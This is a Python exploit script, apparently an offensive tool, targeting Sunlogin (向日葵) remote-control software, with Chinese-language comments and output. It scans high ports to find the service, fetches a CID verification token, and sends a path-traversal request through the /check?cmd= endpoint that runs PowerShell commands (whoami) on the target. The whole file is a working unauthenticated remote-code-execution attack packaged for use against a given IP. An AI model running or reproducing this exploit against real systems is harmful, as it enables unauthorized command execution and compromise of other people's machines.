import argparse

import requests
import sys
import time
import asyncio


def title():
    print("""
  ______                        _____                         _                                _______        ______   ________  
.' ____ \                      |_   _|                       (_)                              |_   __ \     .' ___  | |_   __  | 
| (___ \_|  __   _    _ .--.     | |        .--.     .--./)  __    _ .--.    ______   ______    | |__) |   / .'   \_|   | |_ \_| 
 _.____`.  [  | | |  [ `.-. |    | |   _  / .'`\ \  / /'`\; [  |  [ `.-. |  |______| |______|   |  __ /    | |          |  _| _  
| \____) |  | \_/ |,  | | | |   _| |__/ | | \__. |  \ \._//  | |   | | | |                     _| |  \ \_  \ `.___.'\  _| |__/ | 
 \______.'  '.__.'_/ [___||__] |________|  '.__.'   .',__`  [___] [___||__]                   |____| |___|  `.____ .' |________| 
                                                   ( ( __))                                                                     

                                     Author: Henry4E36
               """)


# 异步扫描端口
async def scan_host(host, port, semaphore):
    result_list = []
    async with semaphore:
        try:
            reader, writer = await asyncio.open_connection(host, port)
            if writer:
                result_list.append(port)
                writer.close()
        except Exception as e:
            pass
    return result_list


async def run_scan_host(host):
    start_time = time.time()
    #加入信号量用于限制并数
    semaphore = asyncio.Semaphore(500)
    task_list = []
    #扫描的端口范围4w-65535
    range_list = [i for i in range(40000, 65536)]
    for port in range_list:
        task_list.append(asyncio.create_task(scan_host(host, port, semaphore)))

    alive_ports = []
    for res in asyncio.as_completed(task_list):
        port = await res
        if port:
            alive_ports.append(port[0])
    end_time = time.time()
    do_time = end_time - start_time
    return alive_ports, do_time


def get_port(host,result):
    for i in result[0]:
        port = i
        do_time = str(result[1]).split(".")[0]
        try:
            res = requests.get(f"http://{host}:{port}", timeout=5)
            if res.status_code == 200 and res.json()['msg'] == "Verification failure":
                print(f"\033[31m[{chr(8730)}] 目标机器可能存在RCE: 端口为{port}\033[0m")
                print(f"用时:{do_time}s")
                return True, port
        except Exception as e:
            pass


def get_cid(url,port):
    try:
        cid_url = f"http://{url}:{port}" + "/cgi-bin/rpc?action=verify-haras"
        res = requests.get(cid_url, timeout=5)
        if res.status_code == 200 and "verify_string" in res.text:
            cid = res.json()['verify_string']
            return cid
    except Exception as e:
        print(e)


def sunlogin_rce(url,port,cid):
    target_url = f"http://{url}:{port}" + f"/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+whoami"
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
        "Cookie": "CID={0}".format(cid)
    }
    try:
        res = requests.get(url=target_url, headers=headers, timeout=5)
        if res.status_code == 200:
            print(f"\033[31m[{chr(8730)}] 执行命令whoami:{res.text} ")
    except Exception as e:
        print(e)


if __name__ == "__main__":
    title()
    parser = ar = argparse.ArgumentParser(description='向日葵 RCE')
    parser.add_argument("-i", "--ip", type=str, metavar="host", help="host or ip eg:\"127.0.0.1\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 sunlogin-RCE.py -i 127.0.0.1")
    elif args.ip:
        host = args.ip
        ports_result = asyncio.run(run_scan_host(host))
        status = get_port(host, ports_result)
        if not status[0]:
            print("目标机器不存在RCE")
            sys.exit(1)
        cid = get_cid(host, status[1])
        if not cid:
            print("目标机器未找到CID")
            sys.exit(1)
        sunlogin_rce(host, status[1], cid)







